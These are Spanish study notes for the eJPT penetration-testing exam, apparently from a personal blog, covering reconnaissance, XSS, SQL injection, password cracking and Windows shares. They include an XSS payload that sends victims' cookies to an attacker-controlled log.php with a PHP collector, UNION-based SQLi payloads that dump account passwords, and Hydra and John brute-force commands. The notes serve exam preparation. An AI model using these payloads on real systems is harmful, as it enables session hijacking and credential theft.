---
title: Mis apuntes para el eJPT
published: true
---

Buenas, bienvenidos a mis apuntes en español para superar el examen eJPT. 

Estos son los apuntes que he ido desarrollando para enfrentarme al examen eJPT, aún no lo he realizado, pero la información siempre es válida.

Acepto sugerencias al respecto, que podéis mandarmelo a: [mail://n4zar1@protonmail.com](n4zar1@protonmail.com)

# [](#header-1)1. Informathion Gathering
## [](#header-2)1.1 Open-Source Intelligence
### [](#header-3)Social Network Information Gathering

En la actualidad, para la recopilación de información utilizamos redes sociales, sitios públicos y la web de la compañía.

Mediante las redes sociales podemos obtener información de personas y productos para idear un ataque potencial.

Por ejemplo, cuando los empleados de una compañía publican informacion sobre los proyectos en curso, viajes para conferencias, números de teléfonos o emails en las redes sociales, nos dan una mina de oro. 

Esta información no es útil solamente para montar ataques phishing o de suplantación de identidad, también nos ayuda a crear un mapa técnico de los sitemas y tecnologías de la compañía.

### [](#header-3)Herramientas para su explotación:


[http://einforma.com](http://einforma.com) (Empresas o Autónomos españoles)
[http://crunchbase.com](http://crunchbase.com) (Fundadores, inversores, empleados, ventas y adquisiciones internacionales)
Whois

## [](#header-2)1.2 Subdomain Enumeration


Para enumerar subdominios podemos tratar de usar dorking, por ejemplo:

site: company.com

Y así comprobar si se nos lista algún subdominio de la misma compañía.

Otra herramienta **MUY ÚTIL** es:

[(http://dnsdumpster.com](http://dnsdumpster.com) La cual nos lista toda la información del dominio.

Herramienta de terminal: sublist3r. Uso:

sublist3r -d domain

**LA MEJOR** Aplicar Fuzzing con Wfuzz y el diccionario SecLists (O OTRO CUALQUIERA). (Diccionario disponible en Github)

# [](#header-1)2. Footprinting and Scanning

## [](#header-2)2.1 Host discovery

Podemos usar la herramienta fping, con la siguiente sintaxis:

```
fping -a -g RangoDeIP/mascara 
```

Sin embargo, esta sintaxis también nos mostrará todos los host que no son accesibles. Para ello, podemos dirigir el stder a /dev/null

También podemos dirigir el stdout a un fichero mediante: 1>fichero

Podemos identificar el SO mediante el TTL, usando trazas ICMP

![](https://www.researchgate.net/profile/Stavros-Shiaeles/publication/260288614/figure/tbl1/AS:614303556186133@1523472789572/Operating-Systems-TTL-Values.png)


Sin embargo, si una máquina está encendida pero no responde a los ping, podemos usar:
```
nmap -Pn -O <$RHOST>
```
**ESCANEO COMPLETO A MÁQUINAS SIN TRAZAS ICMP:**
```
nmap -sn n 10.10.14.*
```

# [](#header-1)3. Web Attacks
## [](#header-2)3.1 Web server Fingerprinting
Hacer Fingerprint de un servidor web significa detectar:

   - El servicio que provee el servidor web, por ejemplo IIS, Apache, nginx entre otros.
   - Su versión
   - El sistema operativo del host del servidor.

### [](#header-3)Netcat, La navaja suiza de TCP

Puedes usar Netcat de múltiples maneras, puedes correr el rol de usuario y de servidor.
Con Netcat podemos mandar manualmente requests al servidor.

#### [](#header-4)Banner Grabbing

Para capturar un banner solo tenemos que conectarnos a un host con un listener, y luego leer el banner que devuelve al cliente.

Para conectar a  un servidor HTTP tenemos que indicar el destino y el puerto a netcat:
```
nc $RHOST $PORT
``` 
Después de conectarnos debemos mandar una solicitud válida HTTP, usando por ejemplo el verbo HTTP HEAD, que solicita la cabecera de un recurso. (Página web, por ejemplo)

Recuerda que cada peticion HTTP tiene dos líneas vacías entre el Header y el cuerpo de la solicitud. Así que si queremos enviar una solicitud sin body, aun así tenemos que indicar estas dos líneas vacías. Ej:
```
$ nc <$RHOST> <$RPORT>
HEAD  / HTTP/1.0
```
Esto hace que en la cabecera Server podamos ver el servicio y el sistema operativo.

(Netcat no es útil en HTTPS)
#### [](#header-4)OpenSSL Fingerprint

Ahora que sabemos cómo usar Netcat en HTTP, nos surge una pregunta.
¿Y cómo performamos esta técnica en un servidor HTTPS?

Para utilizar OpenSSL debemos realizar la siguiente sintaxis:
``` 
$ openssl s_client -connect <$RHOST>:443
HEAD  /  HTTP/1.0
``` 
#### [](#header-4)Httprint on signature-based web servers

Httprint es una herramienta para realizar fingerprint para identificar servidores web que solicitan una firma.

Esta herramienta contiene un diccionario de firmas en /usr/share/httprint

Ejemplo de Sintaxis:
``` 
$ httprint -P0 -h <$RHOST> -s signature_file
``` 
-P0: Evita mandar solicitud ping.
-h: Indica el host.
-s: Indica el archivo de la firma.


## [](#header-2)3.2 HTTP Verbs

Los métodos HTTP más comunes son: GET, POST, HEAD, PUT, DELETE. 

### [](#header-3)GET
Get es usado para solicitar un recurso. Cuando un ejemplo quiere abrir una página web el navegador lanza una petición GET.
``` 
GET /page.php HTTP/1.1
HOST: www.example.site
``` 
También permite introducir argumentos a la aplicación web:
``` 
GET /page.php?course=PTS HTTP/1.1
HOST: www.example.site
``` 
### [](#header-3)POST
Post se utiliza para enviar datos de formularios HTML. Los parámetros de POST deben ir en el body del mensaje.
``` 
POST /login.php HTTP/1.1
Host: www.example.site

username=john&password=mypass
``` 
### [](#header-3)HEAD
Head es muy similar a GET, pregunta únicamente por los headers de la respuesta en lugar del cuerpo completo de la misma. 
``` 
HEAD  / HTTP/1.1
Host: www.example.site
``` 
### [](#header-3)PUT
Put es utilizado para subir archivos al servidor. Es una función muy peligrosa si está permitida.
``` 
PUT /directorio/destino HTTP/1.1
Host: www.example.site

<PUT data>
``` 
### [](#header-3)DELETE
Es utilizado para eliminar un archivo del servidor, igualmente esta funcion deberia estar configurada de manera segura y en caso de no ser así DELETE puede performar ataques DoS y eliminar datos.
``` 
DELETE /Ruta/Eliminacion HTTP/1.1
Host: www.example.site
``` 
### [](#header-3)OPTIONS
Es utilizado para observar los verbos HTTP habilitados en el servidor.
``` 
OPTIONS  / HTTP/1.1
Host: www.example.site
``` 
## [](#header-2)3.3 Fuzzing con WFUZZ
### [](#header-3)DIRECTORY LISTING
``` 
wfuzz -w “wordlist” --hc=404 http://<$RHOST>/FUZZ
``` 
### [](#header-3)DIRECTORY + FILE LISTING
``` 
wfuzz -w “wordlist” --hc=404 http://<$RHOST>/FUZZ.file
``` 

# [](#header-1)4. Vulnerabilidad XSS
## [](#header-2)4.1 ¿Qué es el XSS?
Por una vulnerabilidad XSS un atacante puede:
  - Modificar el contenido del sitio en run-time.
  - Inyectar contenido malicioso.
  - Robar las cookies.
  - Realizar acciones en la web como si fuese un usuario legítimo.
  - Mucho más.

Los actores envueltos en un ataque XSS son:
  - La web vulnerable
  - El usuario víctima
  - El pentester

Las vulnerabilidades XSS ocurren cuando una web usan un input sin filtrado para construir el output, esto permite al atacante controlar la salida HTML y JavaScript, atacando a los usuarios de la aplicación web.

En esta vulnerabilidad el input del usuario es cualquier parámetro que venga de parte del lado de cliente de la web tales como:

  - Request Headers
  - Cookies
  - Form inputs
  - POST parameters
  - GET parameters

La única manera de prevenir estas vulnerabilidades es **NUNCA** confiar en el input del usuario.

La mayoría de las veces las víctimas de los ataques XSS son los usuarios. Ten en mente que un usuario puede ser el administrador del sitio.

XSS consiste en inyectar código malicioso en el output de una página web, código que es ejecutado por el navegador de los usuarios visiantes
## [](#header-2)4.2 Atacantes

Los atacantes pueden explotar vulnerabilidades XSS para atacar a los usuarios de un sitio mediante:

Hacer que sus navegadores carguen contenido malicioso
Realizar operaciones en otro usuario como comprar un producto o cambiar una contraseña
Robar las cookies de sesión, para hacer un ataque de impersonificación.

## [](#header-2)4.3 Encontrar vulnerabilidades XSS

Las vulnerabilidades XSS podemos tratar de descubrirlas probando todos los inputs y comprobando si el contenido escrito en dichos inputs se muestra en el output de la web.

Para probar XSS podemos inyectar algún código en HTML/Javascript como por ejemplo:
```js
<script>alert(‘XSS’)</script>.
``` 
Para explotar una vulnerabilidad XSS necesitamos conocer el tipo de XSS al que nos enfrentamos, estos pueden ser:

  - Reflected
  - Persistent
  - DOM Based
## [](#header-2)4.4 Reflected XSS
Los ataques reflected o reflejados son aquellos cuando el payload está introducido dentro del request que el navegador de la víctima lanza a la web vulnerable.

Pueden ser provocados publicando un link en una red social o mediante una vía de Phishing, cuando los usuarios dan click, el ataque se ejecuta.

Por ejemplo, el formulario de búsqueda que encontramos en la web anterior es un ataque Reflected XSS porque podemos introducir el Payload mediante el parámetro GET find.

(Se recomienda el uso de Firefox para explotar esta vulnerabilidad)

## [](#header-2)4.5 Persistent XSS
Ocurren cuando el payload es enviado a la web vulnerable y luego se almacena. Cuando una página de la web recibe el contenido malicioso este es guardado y mostrado a los usuarios.
Elementos como comentarios, perfiles de usuario, posts de foros son un vector potencial para vulnerabilidades XSS


## [](#header-2)4.6 Performar robo de Cookies con XSS
Como sabemos JavaScript puede acceder a cookies si no tienen la flag HTTPOnly habilitada. En múltiples ocasiones, robar una cookie significa robar una sesión.

Para obtener las cookies via XSS podemos inyectar el siguiente código:
``` js
<script type="text/javascript"> document.location='http://<$RHOST>/log.php?c='+document.cookie; 
</script>
```
Esto, si analizamos el código realiza una petición GET al dominio del atacante, con las cookies del usuario vulnerado. Para recopilar estas cookies en un archivo de texto podemos usar el siguiente código en el archivo log.php:
```php
<?php
$filename=”/tmp/log.txt”;
$fp=open($filename, ‘a’);
$cookie=$_GET[‘q’];
fwrite($fp, $cookie);
fclose($fp);
?>
``` 

# [](#header-1)5. Inyección SQL

Un ataque de inyección SQL permite a un atacante coger el control sobre las declaraciones SQL usadas por una aplicación web.

Este tipo de ataques tiene un fuerte impacto en una web porque conseguir el control sobre una base de datos significa controlar todos los datos de la misma.

Para aprender cómo ejecutar un ataque debemos tener conocimientos básicos de SQL

## [](#header-2)5.1 Consultas SQL (SOBRE CONSOLA)

Una consulta SQL se ve como la siguiente:
```sql
SELECT name, description FROM products WHERE id=9;
```
Esta consulta solicita el nombre y la descripción de la tabla de productos del producto que tiene la ID 9.

También es posible seleccionar valores constantes:
```sql
SELECT 22, ‘string’, 0x12, ‘another string’;
```
También es necesario saber el comando UNION que performa una union entre 2 resultados:
```sql
<CONSULTA SELECT> UNION <CONSULTA SELECT>;
```
Por último la manera de comentar en SQL. Hay 2 strings que podemos usar para comentar una línea:
```sql
# (Hashtag)
--  (Dos dashes acompañados de un espacio)
```
## [](#header-2)5.2 Consultas SQL (SOBRE WEB)

Para ejecutar consultas SQL desde una aplicación web la aplicación debe:

  - Conectarse a la base de datos
  - Enviar la consulta a la base de datos
  - Recibir los resultados

Si esto ocurre, permitiendo así que el usuario mediante un input en GET pueda introducir un valor en una consulta dinámica se genera una vulnerabilidad, ya que no debes confiar nunca en el input de un usuario.

Ejemplo de consulta vulnerable:
```sql
SELECT Name, Description FROM Products WHERE ID=’$id’
```
Aquí se permite al usuario que mediante el parámetro ID, pueda introducir un valor. Sin embargo si el usuario introduce la siguiente cadena:
```sql
SELECT Name, Description FROM Products WHERE ID=’ ‘ OR ‘a’=’a’,
```
Esto le dice a la base de datos que elija los items comprobando dos condiciones:

  - La ID debe estar vacía
  - O una condición que es siempre verdadera.

Al no encontrar nunca una ID vacía, la base de datos seleccionará todos los items de la tabla Productos.

Por lo que, usando el comando **UNION** podemos hacer lo siguiente:
```sql
SELECT Name, Description FROM Products WHERE ID=’ ‘ UNION SELECT Username, Password FROM Accounts WHERE ‘a’=’a’;
```
Mediante un conocimiento profundo de esta vulnerabilidad el atacante puede conseguir el acceso a la base de datos completa utilizando únicamente una aplicación web.


## [](#header-2)5.3 Encontrar vulnerabilidades SQLI
Para ello, debes probar todos los inputs de usuario que permite la aplicación.

Cuando hablamos de aplicaciones WEBS los inputs son los siguientes:

  - Parámetros GET
  - Parámetros POST
  - Headers HTTP:
  - User-Agent
  - Cookie
  - Accept
  - ...

Para probar inputs para inyecciones SQL podemos intentar inyectar lo siguiente:

  - Finales de cadenas de carácteres: ‘ y ‘’
  - Comandos SQL: SELECT, UNION y otros.
  - Comentarios SQL: # o -- 

Comprueba si la aplicación empieza a comportarse de manera extraña. Recuerda, siempre prueba una inyección a la vez, de otras maneras no serás capaz de identificar qué vector es el satisfactorio!

## [](#header-2)5.4 Tipos de vulnerabilidades SQLi


### [](#header-3)Boolean Based SQLi
Los payloads de estas aplicaciones usan “Boolean logic”  para forzar la consulta.

Cuando construimos un payload Boolean Based sQLI queremos transformar la consulta en una condición verdadero/falso que refleje ese estado al output de la aplicación web.

#### [](#header-4)True Payloads:
```sql
‘ OR ‘a’=’a
‘ OR ‘1’=’1
```
#### [](#header-4)False Payloads:
```sql
	‘ OR ‘1’=’11
```
Una vez el pentester conoce la manera de decir cuando una condición es verdadera o falsa pueden preguntarle a la base de datos preguntas de Verdadero/Falso como:

  - ¿Es la primera letra del usuario una a?
  - ¿Contiene la base de datos 3 tablas?
  - Y muchas más

Vamos a ver un ejemplo en el que encontrar el usuario de una base de datos usando una Boolean Based Blind SQLi. Veremos dos funciones MySQL: **user()** y **substring()**

```sql
user() -- Devuelve el nombre del usuario que está usando la base de datos.
substring() -- Devuelve una string de los argumentos dados, tiene 3 parámetros. El input string, la posición del substring y su longitud.
```

Las funciones pueden ser argumento de otras funciones por ejemplo:
```sql
select substring(user(), 1, 1);
```
Además SQL te permite comprobar el output de una función como una condición verdadero/falso.

Ejemplo:
```sql
select substring(user(), 1, 1) = ‘r’;
```
Si el valor devuelto es 1, es verdadero, sin embargo si es 0 es falso.
Sabiendo estas 2 características podemos probar las letras del usuario utilizando payloads como:
```sql
‘ or substr(user(), 1, 1) = ‘a
‘ or substr(user(), 1, 1) = ‘b
```
Para encontrar la primera letra del usuario.
```sql
‘ or substr(user(), 2, 1) = ‘a
‘ or substr(user(), 2, 1) = ‘b
```
Para encontrar la tercera, así hasta conocer al usuario al completo.

Sin embargo enviar todos estos payloads de manera manual es un dolor de cabeza, por lo que en el siguiente tema veremos cómo usar SQLMap para automatizar Inyecciones SQL. 

### [](#header-3)UNION Based SQLi

Algunas veces algunos de los resultados de una consulta son directamente mostrados en el stdout de la aplicación web.

Si tu payload hace que el resultado de la original consulta sea nulo, podemos conseguir los resultados de otra consulta. Por ejemplo:
```sql
SELECT description FROM items WHERE id=’‘ UNION SELECT user(); -- -’;
```
Este payload fuerza a la aplicación web a mostrar el resultado de la función user() en el stdout.
```sql
SELECT description FROM items where id='' UNION SELECT user(); -- -';
```
Nota que hemos usado un pequeño truco en el payload, el comentario no son solo los 2 dashes y un espacio si no que contiene también un tercer dash. Esto es porque la mayoría de los navegadores remueve los espacios en el URL, así que si necesitas inyectar un comentario vía una solicitud GET, debes añadir un carácter después del espacio final del comentario.

También debes saber cuántos campos muestra la consulta vulnerable. Esto es básicamente, prueba y error.

Sabemos que hay una vulnerabilidad aquí pero inyectando lo siguiente nos muestra un error:

![](https://i.imgur.com/OYRTM9e.png)

Esto significa que el número de campos de la consulta original y el de nuestro payload no es el mismo.

Si probamos a añadir otro campo parece funcionar: 

![](https://i.imgur.com/h9E5RYd.png)

Podemos comprobar si podemos probar con 3 campos, si intentamos meter otro null, volverá a mostrarnos el error.

Una vez conocemos cuántos campos hay en la consulta es el momento de probar cuantos campos son parte del output de la web, para ello podemos probar a inyectar algunos valores conocidos y comprobar los resultados en la página página de salida:

Por ejemplo podemos inyectar:
```sql
‘ UNION SELECT ‘elsid1’, ‘elsid2’, -- -
```
Parace que solo un campo es mostrado, sin embargo…
![](https://i.imgur.com/P8YMKzi.png)

Si miramos el código fuente apreciamos que el segundo valor también se ha mostrado.
![](https://i.imgur.com/pgdyayn.png)

### [](#header-3)Evitar el desastre
También debemos tener en cuenta que no únicamente son vulnerables las consultas SELECT, si no que hay más comandos vulnerables:

Por ejemplo:
```sql
DELETE description FROM items WHERE id=[USER INPUT];
```
Entonces, si hacemos la siguiente inyección:
```sql
DELETE description FROM items WHERE id=’1’ or ‘1’=’1’;
```
Esto hará que todas las descripciones sean eliminadas, lo que significa un daño permanente a la base de datos. Para ello antes de inyectar un payload debemos tratar de entender qué hará el código con esa consulta.

## [](#header-2)5.5 SQLMap
Con SQLMap podemos detectar y explotar inyecciones SQL. Pero se recomienda probar las inyecciones manualmente primero y luego usarlas con la herramienta, porque si solo intentamos hacerlo de manera automática, la herramienta podría elegir una explotación ineficiente o incluso crashear el servicio.

La sintaxis básica es muy simple:
```
sqlmap -u <URL> -p <parametros de inyeccion> [opciones]
```
También podemos no añadir el parámetro y que lo haga de forma completamente automatizada, aunque no es recomendable.

Otro ejemplo:
```
sqlmap -u http://websegura.com/view.php?id=1441 -p id --technique=U
```
Mediante el parámetro --technique le estamos indicando que la técnica a usar es UNION based SQL injection.

Si tenemos que explotar un parámetro POST debemos usar:
```
sqlmap -u <URL> --data=<POST string> -p parámetro [options]
```
# [](#header-1)6. Malware
### [](#header-3)6.1 Virus
Un virus es una pequeña pieza de código que pasa de ordenador en ordenador, sin ninguna interacción directa o autorización por los usuarios de las máquinas infectadas.

Usualmente se copian ellos mismos en secciones especiales del disco duro, dentro de programas legítimos o documentos. Ellos se ejecutan cada vez que un programa o archivo se abre.

### [](#header-3)6.2 Troyano
Como su nombre indica, es un malware que aparentemente parece ser un archivo no infectado, como puede ser un documento de office o un PDF. Cuando lo abres se ejecuta.

Los troyanos más comunes para pentesters son los backdoors, estos troyanos le ofrecen un shell al atacante. Hay varios tipos de Backdoors:

### [](#header-3)6.3 Backdoors
Los backdoors son programas con dos componentes:

Servidor y “Backdoor Client”

El servidor se ejecuta en la máquina infectada escuchando la red y aceptando conexiones. El cliente suele ser ejecutado en la máquina del atacante, permitiendo conectarse al backdoor para controlar la máquina infectada.

Puede ser solventados bloqueando las salidas de Internet a las máquinas dentro de una red mediante un firewall.

### [](#header-3)6.4 Rootkit
Un rootkit es un malware diseñado para esconderse de los usuarios y de los antivirus para subvertir todo el funcionamiento del SO

### [](#header-3)6.5 Bootkit
Son rootkits que evitan la protección del sistema operativo por lo que se ejecutan en la fase bootstrap, así pueden controlar la máquina y el sistema operativo ya que cargan antes que este.
### [](#header-3)6.6 Adware
Adware es el software malicioso que te llena google de morenas que quieren conocerte.
### [](#header-3)6.7 Spyware
Spyware es un software utilizado para recoger información de la actividad del usuario.
### [](#header-3)6.8 Greyware
Es un término general para llamar al Malware
### [](#header-3)6.9 Dialer
Es un backdoor que realiza llamadas telefónicas para robar el dinero de la víctima.
### [](#header-3)6.10 Keylogger
Almacena todo lo introducido por el teclado. 
Hay Keyloggers Hardware, es decir keyloggers físicos.
### [](#header-3)6.11 Bots
Los bots son instalados en millones de máquinas con conexión a internet para realizar ataques DDoS.
### [](#header-3)6.12 Ransomware
Software que te encripta los archivos y pide rescate por ellos. 


# [](#header-1)7. Password Attacks
Para hacer las cosas más difíciles a los atacantes las contraseñas deben  estar encriptadas. Los hash son usados para transformar contraseñas en texto claro a contraseñas encriptadas y seguras.

Crackear contraseñas es el proceso de recuperar las contraseñas en texto claro de su hash. Es básicamente un proceso de adivinación. El atacante trata de adivinar la contraseña, se encripta y luego la compara con la contraseña encriptada conocida.

Para automatizar este proceso hay 2 estrategias principales:

## [](#header-2)7.1 Bruteforce Attacks
Consiste en generar y probar todas las contraseñas válidas ya que este es el único método que te da la certeza de encontrar la contraseña del usuario.

Los ataques de fuerza bruta son la única manera de cerciorarse de encontrar la contraseña de alguien. Para automatizar un ataque de fuerza bruta tienes que escribir un programa que genere todas las contraseñas posibles.

Sin embargo, los ataques de fuerza bruta son la última opción en un ataque, por el tiempo que necesitan.

## [](#header-2)7.2 John The Ripper
Escribir un script para implementar un ataque de fuerza bruta no es una tarea difícil por sí, algunas herramientas incluyen funciones útiles como guardados de sesión y la utilización de múltiples hilos en estos ataques.

John puede utilizar cerca de 100 formatos de encriptación. Puedes ver todos los métodos de encripición mediante:
```
john --list=formats
```
La herramienta es extremadamente rápida debido al alto uso de paralelización. También puede usar diferentes estrategias de crackeo durante un ataque de fuerza bruta y puedes especificar diferentes carácteres para la contraseña, como solo letras o solo números.

Ejemplo práctico:

Tenemos un escenario en el cual tenemos los archivos:

**/etc/passwd** Que contiene la información sobre los usuarios.
**/etc/shadow** Que contiene los hashes de las contraseñas.

John necesita que el usuario y la contraseña hasheada estén en el mismo archivo, para ello podemos utilizar la utilidad unshadow, incluida en john The Ripper.
```
unshadow passwd shadow > crackme
```
Usualmente un archivo de contraseñas contiene contraseñas de múltiples usuarios. Si estás interesado en crackear solo uno de ellos puedes utilizar la opción -users. Ejemplo:
```
john -incremental -users:<lista de usuarios> <archivo a crackear>
```
Para ejecutar fuerza bruta a la contraseña del usuario victima debes escribir:
```
john -incremental -users:victima crackme
```
Para mostrar las contraseñas desencriptadas por John puedes usar la opción --show.
```
john --show crackme
```

## [](#header-2)7.3 Dictionary Attacks
Ahora que hemos visto cómo funcionan los ataques de fuerza bruta vamos a ver como usar los ataques de diccionario.

Podemos ejecutar un ataque de diccionario con John usando el argumento -wordlist:
```
john  -wordlist=<diccionario> <archivo para crackear>
```
Podemos aplicar un poco de “mangling”, (mangling es el hecho de utilizar contraseñas parecidas a otras contraseñas del diccionario) con el parámetro rules de la siguiente manera:
```
john  -wordlist=<diccionario> -rules <archivo para crackear>
```
Crackeando crackme con las contraseñas predeterminadas:
```
john -wordlist -users=user1,user2 crackme
```
Si el diccionario por defecto no funciona podemos utilizar uno personalizado. Por ejemplo uno de SecLists o el rockyou en /usr/share/wordlists

## [](#header-2)7.4 Rainbow Tables
Otra forma muy inteligente de crackear contraseñas son las tablas arcoíris, estas ofrecen una compensación entre el tiempo de procesamiento que se necesita para calcular el hash y una contraseña y el espacio de disco que se necesita para ejecutar el ataque.

Una utilidad util para hacer un “crackeo arcoiris” es ophcrack, una herramienta enfocada a la recuperación de contraseñas en Windows, así que puedes usarla únicamente para crackear contraseñas de identificación en Windows.


# [](#header-1)8. Buffer Overflow
Estos ataques funcionan haciéndose del control del flujo de ejecución de un software o rutina del sistema operativo. 

Conseguir el control de la ejecución de cualquier programa significa tener la habilidad de forzarlo a comportarse diferente a lo que la aplicación estaba prevista a hacer.

Estos ataques pueden ocasionar:

Que una aplicación del sistema operativo crashee, provocando un DoS.
  - Escalada de privilegios.
  - Ejecución de código remoto.
  - Bypassear funciones de seguridad

## [](#header-2)8.1 Buffers
Los buffers son un área de la RAM del ordenador, en el cual se reservan datos de manera temporal. Datos tales como:

  - Entradas de Usuarios
  - Partes de un archivo de vídeo
  - Server banners recibidos por una aplicación cliente
  - Etcétera.

Los buffers tienen un tamaño finito, es decir, solo pueden contener una cierta cantidad de datos.

Ejemplo:

Si una aplicación cliente-servidor está diseñada a aceptar únicamente usuarios de 8 carácteres, el buffer del usuario tendrá 8 bytes.

Si el developer de una aplicación no hace cumplir los límites de los buffers un atacante puede encontrar la manera de escribir datos entre esos límites. Esto es actualmente escribir código arbitrario dentro de la RAM del ordenador. Esto puede ser explotado para tener control sobre el flujo de ejecución del programa.

### [](#header-3)Ejemplo de Buffer Overflow

Un programador crea un editor de texto, este declara que el máximo de una línea son 256 caracteres, así que el editor no aceptará user inputs que superen los 256 caracteres.

Un pentester descubre que la aplicación no establece ningún tipo de restricción cuando abre un archivo creado con otro editor. Además, cuando el editor abre un archivo inserta la primera línea en el buffer asignado.

Así que el pentester crea un archivo con una sola línea hecha de, por decir, 512 caracteres aleatorios y lo abre con el editor. La aplicación crashea, esto significa que los datos del archivo han sobrescrito algo del código del editor que ya estaba cargado en RAM.

El pentester escribe un script que genera archivos con líneas muy largas y las abre con la aplicación, y mediante prueba y error el pentester es capaz de generar archivos que cuando se abren por el editor sobreescriben el flujo de ejecución del programa con código válido, dándole al pentester control sobre la aplicación.

## [](#header-2)8.2 Los Stacks
Los stacks o pilas son una estructura de datos utilizada para almacenar información. Los buffers son almacenados en ellos.

Puedes imaginarte un stack como una pila de platos donde puedes añadir o quitar solo un plato cada vez, esto significa que tú sólo puedes añadir un plato por arriba de la fila o quitar uno por abajo.

Este enfoque es llamado Last in First Out (**LIFO**) y utiliza dos métodos:
  - **PUSH**, que añade un elemento a la pila (stack)
  - **POP**, que elimina el último elemento insertado.


En la mayoría de sistemas operativos modernos los stacks son utilizados de una manera más flexible, aunque push y pop se usan también, una aplicación puede aleatorizar el acceso a una posición de la pila para leer y escribir datos.

**Para este examen el Buffer Overflow no entra en el temario de manera muy concreta. Para más información podéis documentaros mediante búsquedas en google o preguntarme por correo.**

# [](#header-1)9. Authentication Cracking
Cuando los pentesters necesitan acceder a un servicio de red pueden tratar de obtener credenciales válidas usando ataques de fuerza bruta o de diccionario.

Performando ataques puros de fuerza bruta sobre una red son poco prácticos  por el tiempo que necesitar en correr cada prueba.

En los ataques de fuerza bruta offline (como John The Ripper, por ejemplo) el tiempo para probar una sola contraseña es dado por el tiempo de procesamiento. Durante un ataque de autenticación en red el tiempo necesitado para probar una contraseña depende de varios factores.

Algunos factores son:

  - Latencia de red: En otras palabras, el tiempo necesario en transmitir la información del ordenador del pentester al servicio víctima y viceversa.
  - Delays en el servicio atacado: Hay múltiples servicios que esperan unos segundos entre cada autenticación para hacer que estos ataques vayan lentos.
  - El tiempo de procesamiento en el servidor atacado: Como en los ataques offline, el servidor víctima debe encriptar y comprobar las credenciales.

Por estos motivos los ataques en autentificación de redes son de manera usual ataques de diccionario.

Se vuelven a recomendar los diccionarios SecList, en concreto el rockyou.txt.

## [](#header-2)9.1 Hydra

Hydra es una herramienta rápida, paralelizada y que soporta diferentes protocolos.

La herramienta puede usar diccionarios de usuarios y contraseñas y puede performar también ataques de fuerza bruta. Tiene módulos específicos para atacar cada protocolo.

Puedes comprobar todas las opciones ejecutando el comando hydra sin argumentos.
También con man hydra o hydra -h.

Además con el parámetro -U podemos obtener información detallada de un módulo. Por ejemplo:
```
hydra -U rdp
```
Para lanzar un ataque de diccionario contra un servicio con una lista de usuarios y una lista de contraseñas debemos usar la siguiente sintaxis.
```
hydra -L users.txt -P pass.txt <servicio://RHOST> <opciones>
```
Por ejemplo, podemos efectuar un ataque en un servicio telnet mediante la siguiente línea de comandos:
```
hydra -L users.txt -P pass.txt telnet://RHOST
```
Para efectuar un ataque sobre un usuario conocido, deberemos hacerlo con el parámetro -l (L minúscula)

El parámetro -f hace que el programa se detenga a la primera contraseña.

También podemos ejecutar ataques mediante **http-get** o **http-post**
```
hydra web http-post-form “/login.php:parametrousuario=^USER^&parametropass=^PASS^:invalid string”
```
(Ademas añadimos mediante -L y -P los usuarios y las contraseñas.)

Desglosamos este comando:

  - **web:** Es el sitio web a atacar.
  - **http-post-form:** El módulo que ejecuta el ataque.
  - **/login.php :** El formulario a atacar.
  - **parametrousuario:** El parámetro POST referente al usuario.
  - **parametropass:** El parámetro POST referente a la contraseña.
  - **invalid string:** Una string que aparece al fallar la contraseña.

(Todos estos parámetros podemos verlos mediante: hydra -U http-post-form)

# [](#header-1)10. Windows Shares
## [](#header-2)10.1 NetBIOS
Para entender los ataques a las comparticiones de Windows, debemos entender como las comparticiones funcionan.

NetBIOS significa Network Basic Input Output System. Servidores y clientes usan NetBIOS cuando ven las comparticiones de red en el área de red local.

NetBIOS puede dar los siguientes datos al consultar otro sistema:

  - Hostname
  - Nombre NetBIOS
  - Dominio
  - Comparticiones de red

El protocolo usado para performar la resolución de nombres de NetBIOS es UDP para llevar a cabo comunicaciones de uno a varios basado en datagramas.

Cuando una máquina Windows navega por una red usa NetBIOS:

  - Datagramas para listar las comparticiones y las máquinas
  - Nombres para encontrar los grupos de trabajo.
  - Sesiones para transmitir información de una compartición de Windows.

## [](#header-2)10.2 Comparticiones
Una máquina Windows puede compartir un archivo o directorio en una red, esto permite a los usuarios locales y remotos acceder al recurso y posiblemente modificarlo.

Esta función es muy útil en un entorno de red, la habilidad de compartir recursos y archivos reduce la redundancia y mejora la eficiencia de trabajo.

Las comparticiones pueden ser extremadamente útiles si son utilizadas correctamente, también extremadamente peligrosas si se configuran de manera incorrecta.

Crear comparticiones de red en un entorno basado en Windows es sencillo. Generalmente los usuarios solo necesitan encender el compartido de archivos e impresoras y pueden elegir directorios y archivos para compartir.

Los usuarios pueden también establecer permisos de una compartición eligiendo quién puede realizar operaciones tales como leer, escribir y modificar permisos.

Empezando por Windows Vista, los usuarios pueden elegir compartir un archivo o usar un directorio público. Cuando comparten un archivo en concreto pueden elegir usuarios locales o remotos con los que compartir el archivo.

Al usar el directorio Público pueden elegir los usuarios locales para acceder a los archivos de la compartición, pero ellos solo pueden elegir si permitir el acceso a todos los miembros de la red o negárselo a todos.

## [](#header-2)10.3 UNC Paths
Un usuario autorizado puede acceder a las comparticiones usando las rutas UNC. (UNIVERSAL CONVENTION PATHS)

El formato de una Ruta UNC es:
```
\\ServerName\ShareName\file.nat
```
También existen algunas comparticiones administrativas por defecto las cuales son utilizadas por los administradores y por Windows en si:
```
\\ComputerName\C$ permite al administrador acceder al disco en la máquina local. Cada volumen tiene una compartición: (C$, D$, E$, etc..)
\\ComputerName\admin$ Señala al directorio de instalación de Windows.
\\ComputerName\ipc$ es utilizado para la comunicación entre procesos. No puedes acceder a él vía Windows Explorer.
```
Puedes comprobar las comparticiones de volúmenes y la compartición admin$ en tu ordenador introduciendo en la barra de tareas:
```
\\localhost\sharename
```
Por ejemplo:
```
\\localhost\admin$
\\localhost\C$
```
Acceder a una compartición significa tener acceso a los recursos del ordenador host. Así que, comparticiones mal configuradas pueden conllevar:

  - Leaks de información
  - Acceso a archivos privados.
  - Ataques Speared, es decir, personalizados por la información obtenida de la compartición.

# [](#header-1)11. Null Sessions
Los ataques de Null Session pueden ser utilizados para enumerar información tal y como:

  - Contraseñas
  - Usuarios de sistema
  - Grupos de sistema
  - Procesos ejecutados por el sistema

Las sesiones nulas son explotables de manera remota. Esto quiere decir que el atacante puede utilizar su ordenador para atacar una máquina Windows vulnerable. Además este ataque puede ser utilizado para llamar a APIs remotas y ejecutar llamadas a procedimientos remotos.

En la actualidad Windows está configurado para ser inmune a esta especie de ataques, de todas maneras los hosts antiguos pueden seguir siendo vulnerables.

Un ataque de Null Session explota una vulnerabilidad de autenticación de las comparticiones administrativas de Windows, que le permite al atacante conectarse a una compartición local o remota sin autenticación.


## [](#header-2)11.1 Utilidades de enumeración en Windows
